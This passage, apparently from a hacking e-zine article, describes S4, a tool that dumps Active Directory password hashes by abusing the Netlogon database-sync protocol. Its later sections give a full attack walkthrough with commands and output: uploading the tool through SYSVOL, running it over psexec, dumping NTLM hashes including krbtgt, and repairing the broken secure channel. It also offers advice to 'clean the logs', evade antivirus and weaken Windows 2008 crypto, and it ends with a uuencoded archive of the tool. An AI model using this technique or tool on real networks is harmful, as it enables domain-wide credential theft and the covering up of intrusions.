+Executing the VBS script on the 'BDC' is enough (remember that we own a
+domain administrator account). The cool thing with this trick is that the
+BDC will then synchronize its password with the 'PDC' for us. Cool trick
+right? And this proved to be enough to have I_NetDatabaseSync()
+successfully returning. In the tool that I wrote, I implemented it using
+the IADsUser::SetPassword() method.
+
+                             &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
+I was lucky with the nltest.exe analysis because I didn't use the Windows
+2008 version. On Windows 2008 server, I_NetDatabaseSync() isn't used so it
+would have forced me to reverse engineer Samba's C code which is far more
+difficult believe me :-P
+                             &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+
+
+---[ 5 - Extracting the secrets
+
+
+Now that this part of the job is finished, we only need to know how to
+parse the DeltaArray objects, something partially documented by Microsoft
+[09]. nltext.exe doesn't perform this task (it only tests that the
+synchronization is working and frees the DeltaArray objects that it
+receives) but obviously samba-tool does.
+
+
+-----[ 5.1 - Browsing samba-tool's source code
+
+
+Everything starts in source4/samba_tool/samba_tool.c:
+
+    1. main() calls binary_net(), the main function
+    2. binary_net() then:
+
+         - Initializes the Python interpreter using Py_Initialize()
+
+         - Creates a dictionary out of the &quot;samba.netcmd&quot; module using
+           py_commands() which returns the Python object &quot;commands&quot;. This
+           object is created in:
+           source4/scripting/python/samba/netcmd/__init__.py:
+
+           -------------------------------------------------------
+           commands = {}
+           from samba.netcmd.pwsettings import cmd_pwsettings
+           commands[&quot;pwsettings&quot;] = cmd_pwsettings()
+           from samba.netcmd.domainlevel import cmd_domainlevel
+           commands[&quot;domainlevel&quot;] = cmd_domainlevel()
+           from samba.netcmd.setpassword import cmd_setpassword
+           commands[&quot;setpassword&quot;] = cmd_setpassword()
+           from samba.netcmd.newuser import cmd_newuser
+           commands[&quot;newuser&quot;] = cmd_newuser()
+           from samba.netcmd.netacl import cmd_acl
+           [...]
+           -------------------------------------------------------
+
+    3. There are 3 possible situations:
+
+         - If argv[1] is handled by a Python module then commands[argv[1]]
+           is not void and the corresponding method is called.
+
+         - Else if argv[1] is in net_functable[] then a C function is
+           handling the command.
+
+         - Else argv[1] is not a legitimate command =&gt; error msg!
+
+In the case of 'samdump', it is implemented in the C language by the
+net_samdump() function available in source4/samba_tool/vampire.c. This
+function calls libnet_SamSync_netlogon() (source4/libnet/libnet_samsync.c)
+which:
+
+    - Establishes the secure channel
+    - Calls dcerpc_netr_DatabaseSync_r() 3 times (1 per DatabaseID value)
+    - Calls samsync_fix_delta() in (libcli/samsync/decrypt.c) which handles
+      the decryption (if required). Remember this function.
+
+
+-----[ 5.2 - Understanding database changes
+
+
+I_NetDatabaseSync() returns DeltaArray which is a NETLOGON_DELTA_ENUM_ARRAY
+object. It's very well documented by Microsoft:
+
+-----------------------[ MS official documentation ]-----------------------
+// http://msdn.microsoft.com/en-us/library/cc237083%28v=prot.13%29.aspx
+typedef struct _NETLOGON_DELTA_ENUM_ARRAY {
+  DWORD CountReturned;
+  [size_is(CountReturned)] PNETLOGON_DELTA_ENUM Deltas;
+} NETLOGON_DELTA_ENUM_ARRAY,
+ *PNETLOGON_DELTA_ENUM_ARRAY;
+
+// http://msdn.microsoft.com/en-us/library/cc237082%28v=prot.13%29.aspx
+typedef struct _NETLOGON_DELTA_ENUM {
+  NETLOGON_DELTA_TYPE DeltaType;
+  [switch_is(DeltaType)] NETLOGON_DELTA_ID_UNION DeltaID;
+  [switch_is(DeltaType)] NETLOGON_DELTA_UNION DeltaUnion;
+} NETLOGON_DELTA_ENUM,
+ *PNETLOGON_DELTA_ENUM;
+---------------------------------------------------------------------------
+
+So basically DeltaArray is an array of NETLOGON_DELTA_ENUM objects.
+Depending on their DeltaType field, the receiver will know how to parse
+their internal fields (DeltaID and DeltaUnion). According to Microsoft,
+DeltaType may take the following values:
+
+-----------------------[ MS official documentation ]-----------------------
+// http://msdn.microsoft.com/en-us/library/cc237100%28v=prot.13%29.aspx
+The NETLOGON_DELTA_TYPE enumeration defines an enumerated set of possible
+database changes.
+
+typedef  enum _NETLOGON_DELTA_TYPE
+{
+  AddOrChangeDomain = 1,
+  AddOrChangeGroup = 2,
+  DeleteGroup = 3,
+  RenameGroup = 4,
+  AddOrChangeUser = 5,
+  DeleteUser = 6,
+  RenameUser = 7,
+  ChangeGroupMembership = 8,
+  AddOrChangeAlias = 9,
+  DeleteAlias = 10,
+  RenameAlias = 11,
+  ChangeAliasMembership = 12,
+  AddOrChangeLsaPolicy = 13,
+  AddOrChangeLsaTDomain = 14,
+  DeleteLsaTDomain = 15,
+  AddOrChangeLsaAccount = 16,
+  DeleteLsaAccount = 17,
+  AddOrChangeLsaSecret = 18,
+  DeleteLsaSecret = 20,
+  DeleteGroupByName = 20,
+  DeleteUserByName = 21,
+  SerialNumberSkip = 22
+} NETLOGON_DELTA_TYPE;
+---------------------------------------------------------------------------
+
+When dcerpc_netr_DatabaseSync_r() returns, samsync_fix_delta() is called
+for each NETLOGON_DELTA_ENUM object. The source code of this function is
+straightforward (libcli/samsync/decrypt.c):
+
+--------------------------[ Samba 4 source code ]--------------------------
+NTSTATUS samsync_fix_delta(TALLOC_CTX *mem_ctx,
+                           struct netlogon_creds_CredentialState *creds,
+                           enum netr_SamDatabaseID database_id,
+                           struct netr_DELTA_ENUM *delta)
+{
+        NTSTATUS status = NT_STATUS_OK;
+
+        switch (delta-&gt;delta_type) {
+                case NETR_DELTA_USER:
+
+                        status = fix_user(mem_ctx,
+                                          creds,
+                                          database_id,
+                                          delta);
+                        break;
+                case NETR_DELTA_SECRET:
+
+                        status = fix_secret(mem_ctx,
+                                            creds,
+                                            database_id,
+                                            delta);
+                        break;
+                default:
+                        break;
+        }
+
+        return status;
+}
+---------------------------------------------------------------------------
+
+So to summarize, amongst all the NETLOGON_DELTA_ENUM that
+I_NetDatabaseSync() provides us, the only important ones are those of type
+AddOrChangeUser (NETR_DELTA_USER) and AddOrChangeLsaSecret
+(NETR_DELTA_SECRET).
+
+
+-----[ 5.3 - Retrieving the hashes
+
+
+Because the subject of this paper is pwdump-like tools, we will only focus
+our attention on the AddOrChangeUser type. Here is the code that I used to
+extract the useful objects:
+
+----------------------------[ S4 source code ]-----------------------------
+	PNETLOGON_DELTA_ENUM Deltas = DeltaArray-&gt;Deltas;
+	for(i=0; i&lt;DeltaArray-&gt;CountReturned; i++)
+	{
+
+#ifdef __debug__
+		if(Deltas-&gt;DeltaType == AddOrChangeLsaSecret)
+		{
+            [...]
+		}
+#endif
+
+		if(Deltas-&gt;DeltaType == AddOrChangeUser)
+        {
+			PNETLOGON_DELTA_USER DUser;
+			DUser = (PNETLOGON_DELTA_USER)
+				Deltas-&gt;DeltaUnion.DeltaUser;
+
+			arcfour_crypt_blob(
+				DUser-&gt;PrivateData.Data,
+				DUser-&gt;PrivateData.DataLength,
+				SessionKey,
+				16);
+			[...]
+		}
+[...]
+---------------------------------------------------------------------------
+
+The NETLOGON_DELTA_USER object holds information about a particular User
+of the domain including its Username and (hashed) password. However
+depending on the value of NtPasswordPresent and LmPasswordPresent, the
+password may not be available in the EncryptedNtOwfPassword and
+EncryptedLmOwfPassword fields of the structure. In this case, they are
+stored instead in the PrivateData.Data buffer which is RC4 encrypted
+using the SessionKey. Practically speaking, this last case is the only one
+I've ever witnessed.
+
+The PrivateData.Data buffer holds a copy of the information returned by
+SamIGetPrivateData() which is a function called by pwdump6. The current
+(and potentially former) hashed passwords are stored somehow in this buffer
+and ripping the appropriate functions in the pwdump6 tool grants us the
+Holy Grail. There is no need to explain what is already common knowledge in
+the windows hacking world.  Have a look at the DealWithDeltaArray()
+function in my code if you have any questions.
+
+
+---[ 6 - A practical introduction to S4 (Stealth &amp; Secure Secret Stealer)
+
+
+All this work ultimately resulted in a single tool: S4 (courtesy of the
+grateful p1ckp0ck3t to the Samba team ;]). I've chosen to release it under
+the GPL because I certainly disliked the idea of the pigs from MSF
+including it in their framework. That said, &quot;let the hacking begin&quot;.
+
+                                  Context
+                                  +++++++
+
+We have a CMD shell on some XP/Seven box part of the 'foo.bar' 2003 domain.
+Somehow we also got our hands on the credentials of a domain administrator:
+&quot;Administrator / foo123&quot;
+
+Our goal is simple; we now want to extract the passwords from the AD.
+
+                              Locating the PDC
+                              ++++++++++++++++
+
+Retrieving the location of the DC is as easy as performing a DNS request on
+the domain name (foo.bar). However the problems with this approach are
+that:
+    - it gives DNS servers as well,
+    - it doesn't allow us to locate the PDC amongst the DCs.
+
+Fortunately, the dsquery tool is providing the information:
+
+------------------------------[ screendump ]-------------------------------
+C:\Users\Administrator&gt;dsquery server -hasfsmo PDC
+&quot;CN=DC3,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=
+foo,DC=bar&quot;
+
+C:\Users\Administrator&gt;
+---------------------------------------------------------------------------
+
+Now if for some reason this command isn't available, you can use the -D
+option of S4 which is based on DsGetDomainControllerInfo().
+
+------------------------------[ screendump ]-------------------------------
+C:\Users\Administrator&gt;S4.exe -D -d foo.bar
+[&gt; Discovery mode
+        - DC controller 0 is DC3.foo.bar [PDC]
+        - DC controller 1 is DC4.foo.bar
+
+C:\Users\Administrator&gt;
+---------------------------------------------------------------------------
+
+At this point, we know that DC3 is the PDC and DC4 (the only remaining DC)
+is de facto a BDC. S4.exe will thus be executed from DC4, targeting DC3.
+
+                               Uploading S4
+                               ++++++++++++
+
+To run S4 on DC4, you first have to upload it. \\%DCNAME%\SYSVOL is
+convenient for this purpose. To drop a file in this directory, you will use
+the Domain Administrator account:
+
+------------------------------[ screendump ]-------------------------------
+c:\S4&gt;hostname
+WINXP
+C:\S4&gt;net use P: \\DC4\SYSVOL
+Enter the user name for 'DC4': administrator
+Enter the password for DC4:
+The command completed successfully.
+
+C:\S4&gt;copy S4.exe P:\randomname.exe
+        1 file(s) copied.
+
+C:\S4&gt;net use P: /DELETE
+P: was deleted successfully
+---------------------------------------------------------------------------
+
+                   Checking the state of the replication
+                   +++++++++++++++++++++++++++++++++++++
+
+It's always good to have an idea of how healthy the replication is on this
+Active Directory because we will interfere deeply. I've never tested the
+technique in an environment prone to replication troubles so I would
+recommend you to be careful.
+
+First log into the BDC using psexec (or your own tool). Then use repadmin
+which will most likely be installed on the box (if not even native) as it
+will give you the details of last operations:
+
+------------------------------[ screendump ]-------------------------------
+C:\S4&gt;.\Tools\PsTools\psexec.exe \\DC4 -u FOO\administrator cmd.exe
+
+PsExec v1.94 - Execute processes remotely
+Copyright (C) 2001-2008 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Password: ******  &lt;-- foo123
+
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\system32&gt;repadmin /showrepl *
+
+repadmin running command /showrepl against server dc3.foo.bar
+
+Default-First-Site-Name\DC3
+DC Options: IS_GC
+Site Options: (none)
+DC object GUID: 265b7dba-578b-47f1-91ca-78b3019e937d
+DC invocationID: 265b7dba-578b-47f1-91ca-78b3019e937d
+
+==== INBOUND NEIGHBORS ======================================
+
+DC=foo,DC=bar
+    Default-First-Site-Name\DC4 via RPC
+        DC object GUID: 5e66dd87-69a1-485e-8e4e-172def165b06
+        Last attempt @ 2012-03-21 00:32:47 was successful.
+
+[...]
+
+repadmin running command /showrepl against server dc4.foo.bar
+
+Default-First-Site-Name\DC4
+DC Options: (none)
+Site Options: (none)
+DC object GUID: 5e66dd87-69a1-485e-8e4e-172def165b06
+DC invocationID: be4bbd07-2a84-4c73-a00c-8260999ea3f8
+
+==== INBOUND NEIGHBORS ======================================
+
+DC=foo,DC=bar
+    Default-First-Site-Name\DC3 via RPC
+        DC object GUID: 265b7dba-578b-47f1-91ca-78b3019e937d
+        Last attempt @ 2012-03-21 00:46:37 was successful.
+
+[...]
+C:\WINDOWS\system32&gt;
+---------------------------------------------------------------------------
+
+This AD is healthy because there is no problem reported. BTW one little
+advice: avoid using your beloved MSF as a psexec-like tool because it has a
+good chance to be detected by an AV.
+
+                           Running S4 on the BDC
+                           +++++++++++++++++++++
+
+At this point, the only remaining thing to do is to run S4.exe!
+
+------------------------------[ screendump ]-------------------------------
+C:\WINDOWS\system32&gt;\\DC4\SYSVOL\randomname.exe
+[!!] 3 arguments are required!
+
+    \\Vboxsvr\vmware\S4.exe -p PDC_NAME -b BDC_NAME -d DOMAIN [-P password]
+
+                        OR
+
+    \\Vboxsvr\vmware\S4.exe -D -d DOMAIN
+
+C:\WINDOWS\system32&gt;\\DC4\SYSVOL\randomname.exe -p DC3 -b DC4 -d foo.bar
+Administrator:500:6F6D84B5C1DDCB7AAAD3B435B51404EE:
+                  23DBA86EAA18933844864F24A54EBFBF:::
+Guest:501:B3CC5A77A68F6477612A53E12DFC183B:
+          B3CC5A77A68F6477612A53E12DFC183B:::
+krbtgt:502:7396CE194FA9157E5993429157021505:
+           3803F74802050CE62B047668F303B453:::
+SUPPORT_388945a0:1001:8FCA67CF5A9FEB7DB06FDACBE2EFDEAB:
+                      5D798B0AB3CCC22FCD7D333D06E2D785:::
+DC3$:1003:C6DD50758AC2B23B9C63DFB8BC64840C:
+          820B5403DF3484530F644090C564E342:::
+DC3$_history_0:1003:C6DD50758AC2B23B9C63DFB8BC64840C:
+                    9CDEE73ADFA23ED3FEC2CC575EF9D0A7:::
+DC4$:1108:8C6AC94AD2F708E2AAD3B435B51404EE:
+          F77ACB17249932BA36990D85D0F7E01A:::
+DC4$_history_0:1108:CA1CDCD62E2662912950352F77B2EC2C:
+                    5E54C47654328C3C7B541A81D6319837:::
+DC4$_history_1:1108:C233128D17B4A8C47838115D84C67E42:
+                    F77ACB17249932BA36990D85D0F7E01A:::
+---------------------------------------------------------------------------
+
+For compatibility purposes, I kept the format used by pwdump-like tools :]
+Just a little test to be sure that the results are not fucked. Fire a
+Python shell and compute the hash of the Administrator:
+
+------------------------------[ screendump ]-------------------------------
+&gt;&gt;&gt; import hashlib,binascii
+&gt;&gt;&gt; hash = hashlib.new('md4', &quot;foo123&quot;.encode('utf-16le')).digest()
+&gt;&gt;&gt; print binascii.hexlify(hash).upper()
+23DBA86EAA18933844864F24A54EBFBF
+&gt;&gt;&gt;
+---------------------------------------------------------------------------
+
+And that's exactly the NTLM of the Administrator \o/
+
+                              Fixing the mess
+                              +++++++++++++++
+
+Now be careful with what I'm about to say because it's *very* important.
+Changing a BDC's machine account password using IADsUser::SetPassword()
+breaks somehow the secure channel between the BDC and the PDC. Breaking the
+secure channel means basically breaking the trust between DCs ultimately
+resulting in a DoS (errors in logs, no more synchronization, ...). Oops :]
+
+This can easily be seen by typing the command:
+
+------------------------------[ screendump ]-------------------------------
+C:\WINDOWS\system32&gt;nltest /SC_CHANGE_PWD:foo.bar
+I_NetLogonControl failed: Status = 5 0x5 ERROR_ACCESS_DENIED
+---------------------------------------------------------------------------
+
+The same command would *not* have failed on DC3 (or on DC4 before changing
+the password). Fortunately, using the Administrator's credentials, you can
+use the *very* useful netdom tool [13] to fix this problem:
+
+------------------------------[ screendump ]-------------------------------
+C:\WINDOWS\system32&gt;netdom RESETPWD /Server:DC3 /UserD:Administrator
+/PasswordD:*
+Type the password associated with the domain user:
+
+The machine account password for the local machine has been successfully
+reset.
+
+The command completed successfully.
+
+C:\WINDOWS\system32&gt;netdom RESET DC4
+The secure channel from DC4 to the domain FOO has been reset.  The
+connection is with the machine \\DC3.FOO.BAR.
+
+The command completed successfully.
+---------------------------------------------------------------------------
+
+Just to prove you that the situation is indeed fixed:
+
+------------------------------[ screendump ]-------------------------------
+C:\WINDOWS\system32&gt;nltest /SC_CHANGE_PWD:foo.bar
+nltest /SC_CHANGE_PWD:foo.bar
+Flags: 0
+Connection Status = 0 0x0 NERR_Success
+The command completed successfully
+---------------------------------------------------------------------------
+
+We're safe! Clean the logs and leave the box :]
+
+
+---[ 7 - S4 .VS. Windows 2008 Domain Controllers
+
+
+While the technique implemented in S4 is very effective if the PDC is a
+Windows 2003 server, it totally fails if it's a Windows 2008 (or higher)
+server and this unfortunately holds even if the Domain's functional level
+is &quot;Windows Server 2003&quot;.
+
+The first problem that I encountered was that while I was still able to
+have the new machine account's NTLM propagated, the establishment of the
+secure channel always failed, an &quot;access denied&quot; being returned by
+NetrServerAuthenticate2(). Because I suspected some evolution in the
+protocol, I began to look for information on Netlogon, only to discover
+that Microsoft had already published its specification [10]. My bad! If I
+had been more careful I would have saved time as there was no real need to
+reverse nltest.exe :] Reading the specifications, I discovered something
+really interesting that I had failed to notice through the reversing
+process; there are different algorithms to compute the session key.
+
+Long story short, when a client initiates a connection to the server, it
+first provides its capabilities using the NegotiateFlags parameter of
+NetrServerAuthenticate(). In return, the server will set this parameter to
+provide his own capabilities. This is the way that they both agree on the
+algorithm used to compute the session key.
+
+There are basically three types of session keys (see section 3.1.4.3 of
+[10]):
+
+    1/ AES (strong)
+    2/ 'Strong-Key' which is HMAC-MD5 based (weaker)
+    3/ DES (weak)
+
+The third one is implemented in S4's NlMakeSessionKey() and is also the
+oldest. For compatibility purposes, Windows 2003 is still accepting this
+weak way of computing keys. This explains why the authentication process
+was OK. Starting with Windows 2008, security has been enhanced and the
+minimum required by default is now Strong-Key; I implemented it and the
+authentication is now compatible with Windows 2008 :]
+
+&lt;Note&gt;
+There exists a workaround (Hi D.) to keep using a weak DES session key with
+a Windows 2008 server. Google() the key words &quot;NT4Emulator&quot; and
+&quot;AllowNT4Crypto&quot; for more details (also have a look at the GPO).
+&lt;/Note&gt;
+
+Unfortunately this was not sufficient as NetrDatabaseSync() was now
+returning a STATUS_NOT_SUPPORTED. Digging in &quot;[MS-NRPC]: Netlogon Remote
+Protocol Specification&quot; I found the following explanation (rev 24):
+
+-----------------------[ MS official documentation ]-----------------------
+If a server does not support a specific Netlogon RPC method, it MUST return
+ERROR_NOT_SUPPORTED or STATUS_NOT SUPPORTED, based on the return type
+---------------------------------------------------------------------------
+
+The revision is important because in revision 22 NetrDatabaseSync() is
+documented whereas it's not anymore in revision 24. It mysteriously
+disappeared... If we consider the previous quote, it seems fair to assume
+that at some point the function was declared deprecated. Unfortunately the
+reason is probably mentioned in revision 23 which seems currently
+unavailable. Who knows, we might some day have the appropriate explanation.
+However &quot;deprecated&quot; doesn't mean &quot;gone&quot; so it *might* be interesting to
+reverse engineer the function ;]
+
+Btw a little trick to help you:
+
+------------------------------[ screendump ]-------------------------------
+C:\Users\Administrator&gt;nltest /dbflag:ffffffff
+SYSTEM\CurrentControlSet\Services\Netlogon\Parameters set to 0xffffffff
+Flags: 0
+Connection Status = 0 0x0 NERR_Success
+The command completed successfully
+
+C:\Users\Administrator&gt;type %WINDIR%\debug\netlogon.log
+[...]
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: DC10$: Message
+: dbcbaafc aba49ab9 f6bcabb5 62380816   ..............8b
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: New Password:
+b6b852a3 5ec54dc9 9ea3917e c51d19fa   .R...M.^~.......
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: New Digest: d4
+67786d a92bd731 7da18262 3d1cdb4f   mxg.1.+.b..}O..=
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: Old Password:
+b6b852a3 5ec54dc9 9ea3917e c51d19fa   .R...M.^~.......
+04/04 22:23:34 [ENCRYPT] NetrLogonComputeServerDigest: 1105: Old Digest: d4
+67786d a92bd731 7da18262 3d1cdb4f   mxg.1.+.b..}O..=
+[...]
+---------------------------------------------------------------------------
+
+
+---[ 8 - Additional details
+
+
+a) Are there other alternatives to dump the AD's passwords?
+
+Well apart from pwdump-like techniques, there is at least one more:
+ntds.dit [11] file dumping. In a nutshell, this file is a Jet Blue database
+holding (amongst other things) information about the users. When an LDAP
+query is issued, this database is interrogated. Because it's very sensitive
+(passwords are stored inside), it's both encrypted and system locked thus
+it's not trivial to dump its content. I wasn't aware until recently of any
+tool able to deal with it. It seems that things have changed because I've
+heard some rumors. There should be at least two other alternatives, but I
+won't say more. Be smart and find them yourself :]
+
+b) What about real-life filtering &amp; the requirement of 2 DCs??
+
+The first requirement for the attack is the ability to execute arbitrary
+commands on one of the DCs. One is enough as by design all of them are
+communicating with one another without any restrictions (=filtering).
+
+The second requirement is the existence of at least 2 DCs. Apart from tiny
+corporations, there will always be at least 2 DCs (for business continuity
+in case of a disaster or maintenance operation) so it's no big deal either.
+
+
+c) What about Samba 4 .VS. Windows 2008?
+
+Well, have a look at samba-4.0.0alpha18.tgz :]
+
+
+---[ 9 - Last words
+
+
+The original title of the paper was something like:
+         &quot;The art of the laziness: exploiting the Samba 4 project&quot;
+
+What I wanted to highlight is that sometimes with only a few ideas and
+minimal efforts you can come up with new tools &amp; techniques. Read the S4
+source code, test it, improve it and use it wisely. As they all say:
+
+               Happy Hacking! :-]
+
+                                        -- High 5 to my fellows
+
+---[ 10 - Bibliography
+
+
+[01]  http://en.wikipedia.org/wiki/Pwdump
+[02]  http://en.wikipedia.org/wiki/Active_Directory
+[03]  http://wiki.samba.org/index.php/Samba4
+[04]  http://securite.intrinsec.com/2010/09/07/
+      rd-outil-dextraction-de-mots-de-passe-ad/
+[05]  http://msdn.microsoft.com/en-us/library/cc237290%28v=prot.13%29.aspx
+[06]  http://en.wikipedia.org/wiki/Primary_Domain_Controller
+[07]  http://www.microsoft.com/download/en/details.aspx?id=16770
+[08]  http://msdn.microsoft.com/en-us/library/cc237225%28v=prot.13%29.aspx
+[09]  http://msdn.microsoft.com/en-us/library/cc237082%28v=prot.13%29.aspx
+[10]  http://msdn.microsoft.com/en-us/library/cc237008%28v=prot.10%29.aspx
+[11]  http://www.stoyanoff.info/blog/2012/02/11/ad-data-store-part-1/
+[12]  http://en.wikipedia.org/wiki/Flexible_single_master_operation
+[13]  http://technet.microsoft.com/en-us/library/cc772217%28v=ws.10%29.aspx
+[14]  http://technet.microsoft.com/en-us/library/cc776877%28WS.10%29.aspx
+
+
+---[ 11 - c0de: S4
+
+
+begin 755 S4.p68.zip
+M4$L#!`H``````-%&gt;A4`````````````````'````4S0N&lt;#8X+U!+`P04``(`
+M&quot;`!G;\&lt;VDADD=!4;``&quot;Q1P``#@```%,T+G`V.&quot;]#3U!924Y'G5Q;&lt;]O(E7X&gt;
+MUO(_=.G%4A7-&amp;7LVEQFEIHJ2*(N)3&quot;DD94=O&quot;Y)-$3$(&lt;-&amp;`-/SW^YU+-QJ\
+M.-FX,K%%`J=/GSZ7[UQ:/_Q@\.?3^,E\&amp;HZ'D\&amp;]&gt;7RZNA]=&amp;_PW'$^'W&lt;X/
+M_`3^?+&amp;E2XO&lt;?.R9O]:Y-1]^^&gt;5#M]/MF.MBNRO3EW5ESJ\O\/&amp;??^GQE^:V
+MM-9,BU7UEI36W!9UODPJD.B94;[HX\WC?_[PBYG9S3:SYC%+%K9GIG5:6?/S
+MSS_US%7A*B+P&gt;6#,3Q\_?/CP_L///_W)F*?I`/2&amp;K[;&lt;%&gt;`M=69KRTU:579I
+MJL(LP*))\J59IJXJTWD-&gt;GAV#G8V]&amp;5J'5XO5J9:X]4L7=C&lt;6;,L%O7&amp;YE7/
+MX`6S6&quot;?Y2YJ_F+0B^GE1F23+BC&gt;[[),8?A!!/98VV&lt;PSRY(QL[7UU)Q9%:79
+M@'_CO$CHOZ5UZ4LN;%;)-WSXENS,KJC+;F&lt;%`2Z+#7WEUOP&quot;ML!\8(M5WYBK
+M';C/JS)Q8++&quot;8GR2-K=EDIG'&gt;HZUNYU[W0Z83O/*YDM9[*5.R@0_6U[,?&amp;\M
+M^J[;\6R_?X]G-L2JJ_$&lt;+1MVA#7H8=XKI`,NG:D=-*=/PD@AY39WQC.7;+&lt;9
+M3H&amp;69QGQ6=BV&quot;G4[C0Z]&lt;Y$8&lt;]Y0DN],@9=*LRV+ES+9F+=U0:3K:EV4#I+:
+M0&quot;/P9+=3.SE(&lt;'4^+396WSNEL*W]+0IH#D0XWW4[7N3WZ;Q,RITYL;DT=Y5-
+MEOT+8YZ+VBR2G/&gt;[,\H.'X`R[7&quot;01=$7_?FZMKEY@WRW-OE&amp;,F'A&gt;FYZ]!5Q
+M5=J5+4O:$L2@!]DC#&gt;UVMB5XP#8?L,)Q[MR!&amp;L9GFU2D'MW..GF5HX[T)#(F
+ML:$##LVY:E'YPCI!$H,(H1&quot;O6-RD*R)NWE*WONB%Q;&quot;=A4U?B4I=+HCV$@=4
+MLMA&gt;+(P/V_)O0H'Q&lt;_0N/:1:VU),O`\]-.!R(7PRE=SD]DU8]N*_%'7R]+[E
+MQ5L@O&quot;R(J&quot;/2$+;30YH5]')E%Y58$OM&quot;QX&gt;3VTBBI25Q+4BAG&quot;P`B&lt;S39;&lt;#
+MS26O12*U.1N_KB.DB'G2;_=-OBKH&lt;$HRY)(W*4^!FYF\U%H'-NZRI&amp;+J&quot;UM6
+M&quot;3:-)[;X,IVG65JEZIJ(M(BUVSEZLK$\&gt;\23'L*F6*8KTF65QRV^LK\GY,%[
+M_IFC!%V]6)O$2QX&quot;6ULRPVX'/U8I;YO]B%E94.*E:KB&amp;EU15$7J2@E8.&quot;9&amp;O
+M:43!TF6S,J2W?3$[?GE/M_'.C@VN%[0NTC1\2VXO:&quot;$(#:`&lt;@1.WAG+@H8U7
+M&quot;\0&lt;\DM,5E0'_TJQHW!$;-7VF,+`#*JUJ=YPNI7=NE_-^8&lt;+#EP26]O2AXYV
+M.^&lt;?+R!&amp;F+YJ3!2ZWM8I9$N2&lt;OQE9E]@^!P3'4=Q#8J]UEF#ZH\&lt;I/A`XQ65
+M\T'F(&quot;DZ%)O0V;%GA2O6[1!ALAYL2O2?[=/KOVH?^0!(WOI879,&gt;NPKON7`F
+MXFGS`@1*&quot;E([7I-WV(Y%.)'1ZB`$\092]M'X?&amp;-I&amp;9LYB13;Q#E\12CB#934
+MA;A8F\&quot;Q'A[8&gt;?-ZPKKD0S\M6&gt;!DTCS)&gt;EA$=T4Q&quot;,(``-APM&quot;V+9;T01CC$
+MT&quot;E#58D&quot;G'9&amp;*D&quot;'$1&amp;#-Y!X]0Y/;.N*`Y#7G%MZ(MOU&gt;)W8;1%;U1K8`_$=
+MRP$4D$0KA!@6@8^?6_J^HF`,'22WRW[EM4B7S,.2_&amp;8IVT:(\XI!P1/FFJCL
+M0W2EG:3Y,GU-ES6Q98HYNQ=9)0`?.('&lt;6.CI@LV/P]0ZHH._$:5LA0#:5V\*
+MY2#%P7FS&amp;K'@-\F24(]99#91'B$%OR&lt;QR'F`6TO14E6R=PI+*`3@8Q)_&gt;&quot;YA
+M'-=O`-N6-&quot;%8,P&gt;P`KL4?TI4R7&quot;PBU[CU53QNQW1O(6@AE5!^!&quot;4_\O#Z.\!
+M;7P]&amp;TX^3\U@?&amp;.N'\8WH]GH83PUMP\3_/CX/!I_ZIF;T70V&amp;5T]T5?\X.&gt;'
+MF]'MZ'I`'\@6?NHSTCJ&amp;K%0[6&gt;K8AX&quot;&gt;MZ+\IOZ&quot;L&quot;0.$&quot;@M(1E1B-X2!&amp;?]
+M)05IW-&amp;ZR&quot;C\N&amp;2GD'@#U`KQ-]X$TJA#B!)9&gt;H!]'(CT1?QGC\+A&amp;6&quot;WA?S@
+MHAC?A!UPV(BV01M@CP@-/&gt;/=S!.Q&lt;%[:D\/A6,1&quot;8U/&gt;=O05$2'&quot;8#9]Q=%!
+MV9B,L-_L.4O&gt;?E4[3YD;[!X+R\,J.]7N%FFS+4I6&quot;(8=V(^R$#(0V@0Y_UA[
+MG/?&amp;(8(OR:&amp;0&quot;`J)DAFLM4Y&gt;2&amp;[G=W&quot;9\`TKR+D7WJ`E&amp;?0OLII`/ZU1U*3Z
+MP,'Z=2X@EL['G,7KGQ%:'9*75TMAUY&lt;LEP`/;#;.G&quot;&amp;RG+'A#.#[7P5*%&quot;I=
+MPF&amp;G[*2U48:?C%4;9&quot;UJHGIQ*=Z745Q=N93=`,(LR'N=2&lt;B/KJ`H=7YP`NJP
+M/2JRRYXB/&quot;8'#PO74&amp;SB5P`,&amp;YA?Y(335[PDG3$'&quot;/:O:&lt;4QTQRH7+?CUSZ'
+M&gt;[1;0FHYIS1P9,3&gt;W`+6LS_#5H_P?`&amp;A?A4P9(*ZE36A=&quot;+F:!T?EL(^EX7U
+M8&gt;)#7P!/LOMW,E^/[930.]?&quot;/'30,2@GM)WF;&quot;\;A(@:N`VVB!!@EU&amp;Z0`+:
+MIHNZJ%TFZ\,-L9^'(N.3+5D^P@\VPDA&quot;V8R?(B+&gt;\M09Z3X669)N(!KP[?'!
+MI?EF[98,A%1!T6&quot;W(^\Y']$(*E&amp;:W7*/DCR2`)*YLSF6H5B'[07:!-&quot;7`CN;
+M'#.&quot;&quot;VWY02-X-][9Z4(@DA4X9D%YS&gt;-\9.&amp;T)%-BQ*N0!RYXO7.PE4RU7,S;
+M)WRRF`+&quot;G9))%%@66W4[M/$`I2*P1H'Y=Y_D&gt;ZBM2O2Q42(%A$Q3]E8&gt;UQWO
+M2=7A=3OB\?!(S:%S(RR?=-(]#;&gt;BLRULREZ_[2#5]YLC86:J&amp;_P`L&lt;]AR4&gt;4
+M%%H&quot;I+ZQ5O1%-N)L%.Q_%4$8DUPT&quot;&lt;0BJ9VD'P%EKM),XNL&quot;(F;Y8I]D\:I^
+M0L21RV4[]ZDJRUT\D9#P?FE)^9IJH3S5]ZS,#UAA524Q!,*1U&quot;`B-37-D&lt;GA
+M$YTW!'#^FO%:6878SY\YB86TMSW?J&quot;&lt;L1/A%ANO%BK*H%OZ&quot;WTATF81$X96;
